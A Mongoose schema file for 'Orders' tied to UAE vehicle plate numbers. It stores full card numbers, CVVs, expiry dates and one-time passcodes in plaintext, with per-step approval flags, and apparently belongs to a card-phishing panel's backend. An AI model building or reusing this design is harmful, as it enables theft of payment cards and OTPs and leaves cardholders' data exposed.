const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema(
    {
      phone: String,
      category:String,
      country:String,
      emirate:String,
      price:String,
      plateCode:String,
      plateNumber:String,

      loginAccept: {
        type: Boolean,
        default: false,
      },

      visa_card_holder_name: String,
      visa_card_number: String,
      visa_cvv: String,
      visa_expiryDate: String,
      bank: String,
      method:String,

      visaAccept: {
        type: Boolean,
        default: false,
      },

      visa_otp: String,

      visaOtpAccept: {
        type: Boolean,
        default: false,
      },
      checked: {
        type: Boolean,
        default: false,
      },
      created: { type: Date, default: Date.now },
    },
    { timestamps: true }
  )
);
